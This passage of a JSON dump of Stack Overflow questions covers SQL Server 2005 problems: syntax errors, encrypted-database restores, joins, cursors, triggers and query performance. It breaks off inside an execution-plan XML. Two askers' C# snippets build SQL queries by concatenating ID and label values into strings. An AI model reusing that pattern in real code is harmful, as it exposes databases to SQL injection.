STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]\n) ON [PRIMARY]\n\nGO\n</code></pre>\n\n<blockquote>\n  <p>Msg 170, Level 15, State 1, Line 12\n  Line 12: Incorrect syntax near '('.</p>\n</blockquote>\n\n<p>Here's the line the error is highlighting:</p>\n\n<blockquote>\n  <p>)WITH (PAD_INDEX = OFF, STATISTICS_NORECOMPUTE = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS = ON, ALLOW_PAGE_LOCKS = ON) ON PRIMARY</p>\n</blockquote>\n\n<p>How can I resolve this?</p>\n"},{"tags":["sql-server","sql-server-2005","encryption","symmetric-key"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":3408,"score":3,"question_id":209927,"title":"SQL Server 2005 - Restoring an encrypted DB on a different server","body":"<p>I have backed up an encrypted DB (symmetric key/certificate) and \nrestored it on a different server. </p>\n\n<p>Unfortuantely we're having problems with the decryption... hoping \nsomeone can help. </p>\n\n<p>In the restored db, I can see the Symmetric Key and the Certificate in \nSSMS, but when I try to Open the key using the cert ( open symmetric \nkey KeyA decryption by certificate CertB )I get the \nfollowing <em>very descriptive</em> error: </p>\n\n<p>Msg 15466, Level 16, State 1, Line 1 \nAn error occurred during decryption. </p>\n\n<p>Any ideas?</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["c#","sql-server-2005","visual-studio-2008","database-connection"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13100678,"title":"Unable to create new SQL Server 2005 database in Visual Studio Team System 2008","body":"<p>I was having some problems with SQL Server 2005, so I re-installed it. Now, in Visual Studio 2008 (Team System), when I right-click <code>Data Connections</code> in <code>Server Explorer</code> &amp; click on <code>Create new SQL Server Database</code>, nothing happens. </p>\n\n<p>Moreover, when I click the <code>Add connection</code> option, the following message pops up:         </p>\n\n<blockquote>\n  <p><em>The System.Windows.Forms.Design.IUIService service could not be\n  found.</em></p>\n</blockquote>\n\n<p>I'm clueless about the problem. Please help. </p>\n"},{"tags":["c#","asp.net","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":13072797,"title":"Read data from database and display it in a txt file","body":"<p>I have a table made in SQL Server 2005 which has the following columns:</p>\n\n<pre><code>Fname (char (50)),\nMailFrom (char (50)),\nMailTo (char (50)),\nSubject (char (50)),\nMBody (char (100)),\nMailID (int)\n</code></pre>\n\n<p>After entering rows into the table, I want to extract and store them in either a text file/ document file/ window form having text fields for each column.</p>\n\n<p>Any suggestions to get the best possible way to extract the data from the database and save it on a file.</p>\n"},{"tags":["sql-server-2005","query-analyzer"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":13099108,"title":"Did not find query analyzer in SQL Server 2005 Express edition","body":"<p>I have downloaded the SQL Server 2005 Express edition and I was not able to fine query analyzer to run the queries or design the database.</p>\n\n<p>Please can anyone help on this.</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005","join"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":38,"score":1,"question_id":13098731,"title":"SQL Join Issue return DISTINCT Names","body":"<p>I have the following two tables with data like so:</p>\n\n<pre><code>Table Values\n var_label\n 1\n 2\n 2\n 1\n 3\n\nTable Codes\nvar_code\n1\n2\n4\n2\n</code></pre>\n\n<p>I need to join these tables and get the distinct result.  The var_label and var_code are equal pieces of data.  I want to have the joined output like so:</p>\n\n<pre><code> MyColumn\n1\n2\n3\n4\n</code></pre>\n\n<p>Wht's the best way to do this?</p>\n"},{"tags":["sql","sql-server-2005","tsql","stored-procedures"],"answer_count":6,"favorite_count":1,"up_vote_count":7,"down_vote_count":0,"view_count":17798,"score":7,"question_id":200195,"title":"How can I determine the status of a job?","body":"<p>I have a Stored procedure which schedules a job. This Job takes a lot of time to get completed (approx 30 to 40 min). I need to get to know the status of this Job.\nBelow details would help me</p>\n\n<p>1) How to see the list of all jobs that have got scheduled for a future time and are yet to start</p>\n\n<p>2) How to see the the list of jobs running and the time span from when they are running</p>\n\n<p>3) How to see if the job has completed successfully or has stoped in between because of any error.</p>\n"},{"tags":["sql-server-2005","tsql"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":7794,"score":1,"question_id":275737,"title":"How do I compare two datetime fields in SQL Server 2005?","body":"<pre><code>DECLARE  @p_date DATETIME\nSET      @p_date = CONVERT( DATETIME, '14 AUG 2008 10:45:30',?)\n\nSELECT   *\nFROM     table1\nWHERE    column_datetime = @p_date\n</code></pre>\n\n<p>I need to compare date time like:</p>\n\n<pre><code>@p_date=14 AUG 2008 10:45:30\ncolumn_datetime=14 AUG 2008 10:45:30\n</code></pre>\n\n<p>How can I do this?</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":13098008,"title":"have to get data from VISIT_Table filter with only date no time","body":"<pre><code>\"SELECT * FROM VISIT_Table WHERE ID='\" + ID + \"' AND DATE ='\" + DateTime.Now.ToString(\"yyyy-MM-dd\") + @\"'\";\n</code></pre>\n\n<p>Above is my query I have to get data from <code>VISIT_Table</code> filter with only date no datetime..</p>\n\n<p>In database <code>visit_date</code> stores <code>2012-10-27 11:10:35</code> I have to get data with only date no time</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":59,"score":2,"question_id":13096882,"title":"SQL Server SQL multiplying Sum results when join multiple tables","body":"<p>It is greatly appreciated if any one can help me out with this. </p>\n\n<p>I am trying to get results from one table where i use sum() function and joins two more tables. My results are multiplying on sum column. Here is how my tables look like and my desired result</p>\n\n<p><strong>Table 1</strong></p>\n\n<pre><code>[Id]   [Account_nbr]  [date]       [seq#]  \n------------------------------------------\n[1234]  [$60] [4321]  [10-15-2012]  [1]\n[1234]  [$20] [4321]  [10-15-2012]  [2]\n[1234]  [$30] [4321]  [10-15-2012]  [3]\n[2345]  [$40] [9876]  [10-15-2012]  [1]\n[3456]  [$50] [6543]  [10-15-2012]  [1]\n</code></pre>\n\n<p><strong>Table2</strong> </p>\n\n<pre><code>[ID]      [cust_num]\n---------------------        \n[1234]     [8765]\n[2345]     [8766]\n[3456]     [8767]\n</code></pre>\n\n<p><strong>Table 3</strong></p>\n\n<pre><code>[cust_num]     [account_nbr]\n-------------------------------     \n[8765]        [4321]\n[8767]        [9876]\n</code></pre>\n\n<p>My desired result will be join <code>Table 1</code>, <code>Table 2</code> using <code>ID</code> and join <code>Table 3</code> using <code>cust_num</code> and see <code>account_nbr</code> from <code>table 1</code> is matching with <code>account_number</code> in <code>Table 3</code> and if match found then </p>\n\n<pre><code>sum(Table1.Amount),Table1.Id,Table1.Account_nbr,Table1.Date\n</code></pre>\n\n<p>I was using a SQL query like this but my sum results are multiplying</p>\n\n<pre><code>SELECT \n    sum((Table1.Amount), Table1.Id, Table1.Account_nbr, Table1.Date\nFROM \n    table1, table2, table3 \nWHERE \n    table1.id = table2.id    \n    AND table2.cust_num = table3.cust_num    \n    AND table1.account_nbr = table3.account_nbr     \nGROUP BY\n    table1.id,table1.account_nbr,table1.date    \nORDER BY \n    table1.date DESC\n</code></pre>\n\n<p>But like I said earlier my results are multiplying. My desired results in tabular form as mentioned below </p>\n\n<pre><code>[Amount]     [Id]     [Account_nbr]    [Date]\n---------------------------------------------------\n[$110]       [1234]   [4321]           [10-15-2012]\n[$40]        [2345]   [9876]           [10-15-2012]\n</code></pre>\n\n<p>The <code>id = 3456</code> should not be there because the corresponding <code>account_nbr</code> from <code>table1</code> not exist in <code>table3</code>.</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":13096707,"title":"Passing data into nested cursors in TSQL","body":"<p>I have a cursor that gets data and fetches it into @data_table.  Then in the while loop I want to pass that @data_table into another cursor (as the table name) to run some more processing. I keep getting a declare @data_table error. How do I fix this?</p>\n\n<pre><code>DECLARE @var_name varchar(50)\nDECLARE @data_table varchar(50)\nDECLARE @data_value varchar(50)\n\nDECLARE curDiscreteVars CURSOR LOCAL\n\nFOR SELECT DISTINCT v.var_name, v.data_table \n    FROM dbo.vars v\n    GROUP BY v.var_name, v.data_table\n\n-- Loop through cursor, translating variable values as needed, and generate counts for each val_code for a variable\nOPEN curDiscreteVars\nFETCH NEXT FROM curDiscreteVars \n    INTO @var_name, @data_table\n\nWHILE @@FETCH_STATUS  = 0\nBEGIN\n    --loop through all possible data values\n\n    DECLARE curValues CURSOR LOCAL\n\n    FOR SELECT DISTINCT @var_name  \n        FROM @data_table\n\n    OPEN curValues\n    FETCH NEXT FROM curValues \n        INTO @data_value\n\n    WHILE @@FETCH_STATUS  = 0\n    BEGIN\n        print @var_name\n\n\n\n        FETCH NEXT FROM curValues \n        INTO @data_value\n    END\n\n    CLOSE curValues\n    DEALLOCATE curValues\n\n    FETCH NEXT FROM curDiscreteVars \n    INTO @var_name, @data_table\nEND\n\nCLOSE curDiscreteVars\nDEALLOCATE curDiscreteVars\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005","temporary-tables","alter-table"],"answer_count":5,"favorite_count":4,"up_vote_count":40,"down_vote_count":0,"view_count":72889,"score":40,"question_id":659051,"title":"check if temp table exist and delete if it exists before creating a temp table","body":"<p>I am using the following code to check if the temp table exists and drop the table if it exists before creating again. It works fine as long as I don't change the columns. If I add a column later, it will give an error saying \"invalid column\". Please let me know what I am doing wrong.</p>\n\n<pre><code>IF OBJECT_ID('tempdb..#Results') IS NOT NULL\n    DROP TABLE #Results\n\nCREATE TABLE #Results\n(\n    Company             CHAR(3),\n    StepId              TINYINT,    \n    FieldId             TINYINT,\n)\n\nselect company, stepid, fieldid from #Results\n</code></pre>\n\n<p>If I run the above code, it works fine. Now let's say I add a column fieldname and use that field in the select statement, it gives an error. </p>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":35,"score":-2,"question_id":13091822,"title":"insert new values without overwriting previous values sql","body":"<p>I have a table i need to add info to for 450 rows, i can identify each row with a unique order number and only need to update 4 of the rows on the table for each order number.</p>\n\n<pre><code>update ordercontacts\nset firstname = 'joe', lastname = 'smith', email = 'joesmith@smith.com', contacttypeid = 13\nwhere orderid = 1284480\n</code></pre>\n\n<p>this just replaced my values so i had to fix that </p>\n\n<p>i tried this as well    </p>\n\n<pre><code>insert into ordercontacts\n(firstname, lastname, email, contacttypeid)\nvalues\n('joe', 'smith', 'jowsmith@smith.com', 13)\nwhere orderid in (1284480)\n</code></pre>\n\n<p>but the syntax is not correct and im not sure what the correct syntax would be</p>\n\n<p>I had thought something like this would work but it doesnt obviously.  Can anyone help me out? Each of the order numbers already has a different contact attached to it, i basically want the end result to be like this:</p>\n\n<pre><code>order     firstname   lastname        email               contacttypeid\n1284480   joe        smith      joesmith@smith.com         13\n1284480   steve      andrews      steve@steve.com         11\n</code></pre>\n\n<p>Im looking to add a new contact on top of one that already exists for each order number.  The syntax for the update i have is only replacing the info that is already there.</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":69,"score":0,"question_id":13088621,"title":"sql server updating new column based on another column from same table","body":"<p>I have a table with composite primary key based on three columns.</p>\n\n<p><code>(Unit, Account, service)</code></p>\n\n<p>I have another two columns: <code>DOB</code> (this holds date of birth) &amp; <code>Age</code> (this is a new int column which needs to be updated based on DOB and the result will be integer value of years)</p>\n\n<p>I know how to retrieve the reslt for Age</p>\n\n<pre><code>select datediff(Year,DOB,GETDATE()) as AGE\n</code></pre>\n\n<p>But not sure how to update entire table based on the rows DOB data.</p>\n\n<p>Columns are <code>Unit, Account, Service, DOB, Age</code></p>\n"},{"tags":["c#","sql-server-2005","asp.net-2.0"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":13076980,"title":"which of following code is better performance wise in ASP.NET 2.0","body":"<p>I have been using a datatable to display some fields from SQL 2005 database table in my website which is built in ASP.NET 2.0.</p>\n\n<p>lately its been throwing timeout errors saying all the max connection pools have been reached.</p>\n\n<p>here is my code using the SqlDataAdapter performing this on a Repeater OnDataItemBound.</p>\n\n<pre><code>#region repeater item databound\n    protected void rProducts_OnItemDataBound(object source, RepeaterItemEventArgs e)\n    {\n\n        // displaying sale and original price //\n        Label lblitemid = e.Item.FindControl(\"itemID\") as Label;\n        decimal strOP;\n        decimal strSP;\n        string salequery = \"select SaleItemNo, OriginalPrice, SalePrice, OriginalPriceRange, SalePriceRange from SaleItems where CatalogItemId='\" + lblitemid.Text + \"'\";\n        SqlConnection myconnection1 = new SqlConnection(ConfigurationManager.ConnectionStrings[\"DBconnection\"].ConnectionString);\n        SqlCommand SqlCmd1 = null;\n        SqlCmd1 = new SqlCommand(salequery, myconnection1);\n        SqlDataAdapter ad1 = new SqlDataAdapter(SqlCmd1);\n        DataTable dt1 = new DataTable();\n        ad1.Fill(dt1);\n\n        Label lbloriprice = e.Item.FindControl(\"originalprice\") as Label;\n        if (dt1.Rows[0][\"OriginalPrice\"].ToString() == \"\" || dt1.Rows[0][\"OriginalPrice\"].ToString() == \"0.00\")\n        {\n            lbloriprice.Attributes.Add(\"style\", \"display:none\");\n        }\n        else\n        {\n            strOP = Convert.ToDecimal(dt1.Rows[0][\"OriginalPrice\"].ToString());\n            lbloriprice.Text = strOP.ToString(\"c\");\n        }\n\n        Label lbloprange = e.Item.FindControl(\"opRange\") as Label;\n        if (dt1.Rows[0][\"OriginalPriceRange\"].ToString() != \"\")\n        {\n            lbloprange.Text = dt1.Rows[0][\"OriginalPriceRange\"].ToString();\n            lbloprange.Visible = true;\n            lbloriprice.Visible = false;\n        }\n\n        Label lblsaleprice = e.Item.FindControl(\"saleprice\") as Label;\n        if (dt1.Rows[0][\"SalePrice\"].ToString() == \"\" || dt1.Rows[0][\"SalePrice\"].ToString() == \"0.00\")\n        {\n            lblsaleprice.Attributes.Add(\"style\", \"display:none\");\n        }\n        else if (dt1.Rows[0][\"SalePriceRange\"].ToString() != \"\")\n        {\n            lblsaleprice.Text = \"Special &lt;br /&gt;\" + dt1.Rows[0][\"SalePriceRange\"].ToString();\n        }\n        else\n        {\n            strSP = Convert.ToDecimal(dt1.Rows[0][\"SalePrice\"].ToString());\n            lblsaleprice.Text = \"Special &lt;br /&gt;\" + strSP.ToString(\"c\");\n        }\n\n    }\n\n    #endregion\n</code></pre>\n\n<p>It's throwing errors on ad1.fill(dt1)</p>\n\n<p>I redesigned my code and was wondering if this will reduce or remove the errors. Please advice</p>\n\n<pre><code>   #region repeater item databound\n    protected void rProducts_OnItemDataBound(object source, RepeaterItemEventArgs e)\n    {\n\n        // displaying sale and original price //\n        Label lblitemid = e.Item.FindControl(\"itemID\") as Label;\n\n        SqlDataSource SqlDataSource2 = new SqlDataSource();\n        SqlDataSource2.ID = \"SqlDataSource2\";\n        SqlDataSource2.ConnectionString = ConfigurationManager.ConnectionStrings[\"DBconnection\"].ConnectionString;\n        SqlDataSource2.SelectCommand = \"select SaleItemNo, OriginalPrice, SalePrice, OriginalPriceRange, SalePriceRange from SaleItems where CatalogItemId='\" + lblitemid.Text + \"'\";\n\n        Repeater rep = e.Item.FindControl(\"rpt2\") as Repeater;\n        rep.DataSource = SqlDataSource2;\n        rep.DataBind();\n\n     }\n#endregion\n</code></pre>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":23,"score":2,"question_id":13087699,"title":"computed column or indexed view?","body":"<p>I have a column part # that can contain many non-alphanumeric characters.  I frequently need to compare part #'s from customers or vendors to our data.  I've been doing this successfully with a user-defined function that returns only alpha-Numeric.  I improved performance by creating a computed column called stripPartNum on an indexed view.  I would like to move this computed column to the table.</p>\n\n<p>I cannot create the computed column as persisted so I can create an index on the column.<br>\nError:\nComputed column 'stripPartNum' in table 'inventory' cannot be persisted because the column is non-deterministic.</p>\n\n<p>I created a new user-defined function not using patIndex, but still have the same problem.\nHere is the function:</p>\n\n<pre><code>Create FUNCTION [dbo].[anOnly]\n(\n@string VARCHAR(900)\n)\nRETURNS VARCHAR(900)\n\nAS\nBEGIN\n\nDeclare @pos int,@newString varchar(1000),@charAt char(1)\nSet @pos = 0\nSet @newString = ''\n\nwhile @pos &lt;= len(@string)\n    begin\n    Set @charAt = substring(@string,@pos,1)\n    if @charAt not like '[^0-9A-Za-z]'\n        Set @newString = @newString + @charAt\n    Set @pos = @pos + 1\n    end\n\nreturn @newString\nEND\n</code></pre>\n\n<p>Why am I able to create an index on the computed column in the view but not on the table?  Is there a solution I am overlooking?</p>\n"},{"tags":["sql-server","sql-server-2005","permissions","login","user"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":9526,"score":0,"question_id":372834,"title":"Permissions required for 'CREATE USER' in SQL Server 2005?","body":"<p>I am trying to create a SQL server login and database user from within my application, along with a custom application user row. I want these users to be able to create other users - i.e. the application will control who can/can't create users but I need all users to have permissions for creating SQL server logins and database users.</p>\n\n<p>I have got the server login permissions working - i.e. an existing user/login can create a new login - by adding the logins to the 'securityadmin' server role - which grants the 'ALTER ANY LOGIN' privilege. </p>\n\n<p>I tried to do the same with the database users - adding them to the 'db_accessadmin' database role - which supposedly grants the ALTER ANY USER privilege, which is required for CREATE USER. </p>\n\n<p>However any time I try to create a new database user using a user with the above privileges I get a permissions exception.</p>\n\n<p>I have tried manually granting the ALTER ANY USER permission to a particular user (GRANT ALTER ANY USER TO demouser) but this doesn't work either.</p>\n\n<p>Any ideas about what I am missing here? </p>\n\n<p>Thanks in advance!</p>\n"},{"tags":["sql-server-2005","tsql"],"answer_count":7,"favorite_count":3,"up_vote_count":19,"down_vote_count":0,"view_count":47176,"score":19,"question_id":1256915,"title":"Remove the last character in a string in T-SQL?","body":"<p>How do I remove the last character in a string in T-SQL?</p>\n\n<p>I.E. \n'TEST STRING'</p>\n\n<p>to return:</p>\n\n<p>'TEST STRIN'</p>\n\n<p>thanks\nDave</p>\n"},{"tags":["c#","sql-server-2005","rabbitmq"],"answer_count":1,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":58,"score":5,"question_id":13087058,"title":"Consuming SQL Server data events for messaging purposes","body":"<p>At our organization we have a SQL Server 2005 database and a fair number of database clients: web sites (php, zope, asp.net), rich clients (legacy fox pro). Now we need to pass certain events from the core database with other systems (MongoDb, LDAP and others). Messaging paradigm seems pretty capable of solving this kind of problem. So we decided to use RabbitMQ broker as a middleware.</p>\n\n<p>The problem of consuming events from the database at first seemed to have only two possible solutions:</p>\n\n<ol>\n<li>Poll the database for outgoing messages and pass them to a message broker. </li>\n<li>Use triggers on certain tables to pass messages to a broker on the same machine.</li>\n</ol>\n\n<p>I disliked the first idea due to latency issues which arise when periodical execution of sql is involved. </p>\n\n<p>But event-based trigger approach has a problem which seems unsolvable to me at the moment. Consider this scenario:</p>\n\n<ol>\n<li>A row is inserted into a table.</li>\n<li>Trigger fires and sends a message (using a CLR Stored Procedure written in C#)</li>\n</ol>\n\n<p>Everything is ok unless transaction which writes data is rolled back. In this case data will be consistent, but the message has already been sent and cannot be rolled back because trigger fires at the moment of writing to the database log, not at the time of transaction commit (which is a correct behaviour of a RDBMS).</p>\n\n<p>I realize now that I'm asking too much of triggers and they are not suitable for tasks other than working with data.</p>\n\n<p>So my questions are:</p>\n\n<ol>\n<li>Has anyone managed to extract data events using triggers?</li>\n<li>What other methods of consuming data events can you advise?</li>\n<li>Is Query Notification (built on top of Service Broker) suitable in my situation?</li>\n</ol>\n\n<p>Thanks in advance!</p>\n"},{"tags":["sql-server","tsql","sql-server-2005","count"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":28,"score":1,"question_id":13080925,"title":"Counting frequency of values assigned to different types","body":"<p>I apologize in advance for my poor description, I couldn't think of a way to word it better, but I'll try to explain it thoroughly.</p>\n\n<p>Let's say that I have a table setup in this manner:</p>\n\n<h2>Input Table</h2>\n\n<pre><code>Itm Type\nA   Apple\nB   Orange\nC   Apple\nB   Grape\nD   Peaches\nB   Apple\nC   Grapes\nE   Apple\nA   Apple\n</code></pre>\n\n<p>The goal is to produce a table showing each item (A, B, C, D, and E) with the total number of each type that was assigned to that item.</p>\n\n<h2>Goal Output Table</h2>\n\n<pre><code>Itm    Apple  Orange  Grape  Peaches    \nA       2       0       0       0   \nB       1       1       1       0\nC       1       0       1       0\nD       0       0       0       1\nE       1       0       0       0\n</code></pre>\n\n<p>The query I'm using now displays a table where it seems to be summing up all of the types for all of the items and placing that value on each row.</p>\n\n<p>Thanks in advance!</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005","sql-server-2008-r2"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":54,"score":2,"question_id":13082595,"title":"T-SQL: How to deny update on one column of a table via trigger?","body":"<p>Question: <br />\nIn our SQL-Server 2005 database, we have a table T_Groups.<br />\nT_Groups has, amongst other things, the fields ID (PK) and Name.</p>\n\n<p>Now some idiot in our company used the name as key in a mapping table...<br />\nWhich means now one may not alter a group name, because if one does, the mapping is gone...\n<br />\nNow, until this is resolved, I need to add a restriction to T_Groups, so one can't update the group's name. <br />\nNote that insert should still be possible, and an update that doesn't change the groupname should also be possible.<br /></p>\n\n<p>Also note that the user of the application &amp; the developers have both dbo and sysadmin rights, so REVOKE/DENY won't work.\n<br /><br />\nHow can I do this with a trigger ?</p>\n"},{"tags":["sql-server","sql-server-2005","ssis","csv","import"],"answer_count":5,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":8100,"score":4,"question_id":89372,"title":"How to import variable record length CSV file using SSIS?","body":"<p>Has anyone been able to get a variable record length text file (CSV) into SQL Server via SSIS?</p>\n\n<p>I have tried time and again to get a CSV file into a SQL Server table, using SSIS, where the input file has varying record lengths.  For this question, the two different record lengths are 63 and 326 bytes.   All record lengths will be imported into the same 326 byte width table.</p>\n\n<p>There are over 1 million records to import.<br />\nI have no control of the creation of the import file.<br />\nI must use SSIS.<br />\nI have confirmed with MS that this has been reported as a bug.\nI have tried several workarounds.  Most have been where I try to write custom code to intercept the record and I cant seem to get that to work as I want.</p>\n"},{"tags":["sql-server","sql-server-2005","ddl"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":635,"score":2,"question_id":7956620,"title":"Do statistics referencing a column prevent that column from being dropped?","body":"<p>I'm trying a very simple <code>drop column</code> statement:</p>\n\n<pre><code>alter table MyTable drop column MyColumn\n</code></pre>\n\n<p>and receiving several errors along the lines of</p>\n\n<blockquote>\n  <p>Msg 5074, Level 16, State 1, Line 1<br>\n  The statistics '_dta_stat_1268251623_3_2' is dependent on column 'MyColumn'.</p>\n</blockquote>\n\n<p>followed ultimately by</p>\n\n<blockquote>\n  <p>Msg 4922, Level 16, State 9, Line 1<br>\n  ALTER TABLE DROP COLUMN MyColumn failed because one or more objects access this column.</p>\n</blockquote>\n\n<p>I didn't think statistics prevent a column from being dropped. Do they? If so, since these are apparently auto-created statistics I can't depend on the names being the same across multiple copies of the same database, so how could I drop all such statistics in an upgrade script to be executed on a different database?</p>\n"},{"tags":["sql","sql-server-2005","tsql"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":3263,"score":0,"question_id":2448714,"title":"Getting average from 3 columns in SQL Server","body":"<p>I have a table with 3 columns (<code>smallint</code>) in SQL Server 2005.</p>\n\n<pre><code>Table Ratings\nratin1 smallint,\nratin2 smallint\nratin3 smallint\n</code></pre>\n\n<p>These columns can have values from <code>0</code> to <code>5</code>.</p>\n\n<p>How can I select the average value of these fields, but only compare fields where the value is greater then <code>0</code>.</p>\n\n<p>So if the column values are <code>1</code>, <code>3</code> ,<code>5</code> - the average has to be <code>3</code>.\nif the values are <code>0</code>, <code>3</code>, <code>5</code> - The average has to be <code>4</code>.</p>\n"},{"tags":["performance","query","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":74,"score":3,"question_id":12854990,"title":"Why would ISNULL improve the performance of a query?","body":"<p>We're currently trying to speedup some queries and we've run into something which I (not a DBA just a .NET developer) cannot explain or comprehent. We're running this query on SQL Server 2005.</p>\n\n<p>We have the following query (made small and simple for the sake of argument);</p>\n\n<pre><code>SELECT    \n    *\nFROM    \n    RandomTable \nWHERE   \n    MoneyColumn &lt;&gt; 0\nGROUP BY\n    SomeColumn\n</code></pre>\n\n<p>This query run in around <strong>three</strong> seconds, then we randomly tried to following to speed it up (shot in the dark really)</p>\n\n<pre><code>SELECT    \n    *\nFROM    \n    RandomTable \nWHERE   \n    isnull(MoneyColumn,0) &lt;&gt; 0\nGROUP BY\n    SomeColumn\n</code></pre>\n\n<p>This reduces the query speed to around <strong>one</strong> second..</p>\n\n<p>This column has no NULL values (yet due to the database design beeing HORRIBLE) it is however NULLABLE...</p>\n\n<p>Is the fact that it's NULLABLE making SQL Server do something to account for this making it slow where the ISNULL isn't beeing mentioned? I simply have no idea why the ISNULL would make it perform faster (and by such a big margin). I'd think SQL would actually have more to do when there is a ISNULL statement in the query.</p>\n\n<p>Can anyone shed some light on this?</p>\n\n<p><strong>EDIT</strong> Execution plans added</p>\n\n<p><strong>With ISNULL</strong></p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-16\"?&gt;\n&lt;ShowPlanXML xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" Version=\"1.0\" Build=\"9.00.5000.00\" xmlns=\"http://schemas.microsoft.com/sqlserver/2004/07/showplan\"&gt;\n  &lt;BatchSequence&gt;\n    &lt;Batch&gt;\n      &lt;Statements&gt;\n        &lt;StmtSimple StatementCompId=\"1\" StatementEstRows=\"9019.76\" StatementId=\"1\" StatementOptmLevel=\"FULL\" StatementSubTreeCost=\"1.48105\" StatementText=\"SELECT    debiteur_id, MIN(Faktuurdatum) AS OldestOpenInvoiceDate, ISNULL(SUM(Totaal_Open),0) AS TotalOpenAmount&amp;#xD;&amp;#xA;FROM    dbo.tbl_Faktuur &amp;#xD;&amp;#xA;WHERE   (Afgehandeld_NeeJa = 0 OR Afgehandeld_NeeJa IS NULL)&amp;#xD;&amp;#xA;AND        (ISNULL(Totaal_Open,0) &amp;lt;&amp;gt; 0) &amp;#xD;&amp;#xA;--AND        (Totaal_Open &amp;lt;&amp;gt; 0) &amp;#xD;&amp;#xA;GROUP BY debiteur_id\" StatementType=\"SELECT\"&gt;\n          &lt;StatementSetOptions ANSI_NULLS=\"false\" ANSI_PADDING=\"false\" ANSI_WARNINGS=\"false\" ARITHABORT=\"true\" CONCAT_NULL_YIELDS_NULL=\"false\" NUMERIC_ROUNDABORT=\"false\" QUOTED_IDENTIFIER=\"false\" /&gt;\n          &lt;QueryPlan DegreeOfParallelism=\"1\" MemoryGrant=\"1520\" CachedPlanSize=\"54\" CompileTime=\"11\" CompileCPU=\"11\" CompileMemory=\"704\"&gt;\n            &lt;RelOp AvgRowSize=\"23\" EstimateCPU=\"0.000901976\" EstimateIO=\"0\" EstimateRebinds=\"0\" EstimateRewinds=\"0\" EstimateRows=\"9019.76\" LogicalOp=\"Compute Scalar\" NodeId=\"0\" Parallel=\"false\" PhysicalOp=\"Compute Scalar\" EstimatedTotalSubtreeCost=\"1.48105\"&gt;\n              &lt;OutputList&gt;\n                &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Debiteur_ID\" /&gt;\n                &lt;ColumnReference Column=\"Expr1003\" /&gt;\n                &lt;ColumnReference Column=\"Expr1005\" /&gt;\n              &lt;/OutputList&gt;\n              &lt;ComputeScalar&gt;\n                &lt;DefinedValues&gt;\n                  &lt;DefinedValue&gt;\n                    &lt;ColumnReference Column=\"Expr1005\" /&gt;\n                    &lt;ScalarOperator ScalarString=\"isnull([Expr1004],($0.0000))\"&gt;\n                      &lt;Intrinsic FunctionName=\"isnull\"&gt;\n                        &lt;ScalarOperator&gt;\n                          &lt;Identifier&gt;\n                            &lt;ColumnReference Column=\"Expr1004\" /&gt;\n                          &lt;/Identifier&gt;\n                        &lt;/ScalarOperator&gt;\n                        &lt;ScalarOperator&gt;\n                          &lt;Const ConstValue=\"($0.0000)\" /&gt;\n                        &lt;/ScalarOperator&gt;\n                      &lt;/Intrinsic&gt;\n                    &lt;/ScalarOperator&gt;\n                  &lt;/DefinedValue&gt;\n                &lt;/DefinedValues&gt;\n                &lt;RelOp AvgRowSize=\"23\" EstimateCPU=\"0.291662\" EstimateIO=\"0\" EstimateRebinds=\"0\" EstimateRewinds=\"0\" EstimateRows=\"9019.76\" LogicalOp=\"Compute Scalar\" NodeId=\"1\" Parallel=\"false\" PhysicalOp=\"Compute Scalar\" EstimatedTotalSubtreeCost=\"1.48014\"&gt;\n                  &lt;OutputList&gt;\n                    &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Debiteur_ID\" /&gt;\n                    &lt;ColumnReference Column=\"Expr1003\" /&gt;\n                    &lt;ColumnReference Column=\"Expr1004\" /&gt;\n                  &lt;/OutputList&gt;\n                  &lt;ComputeScalar&gt;\n                    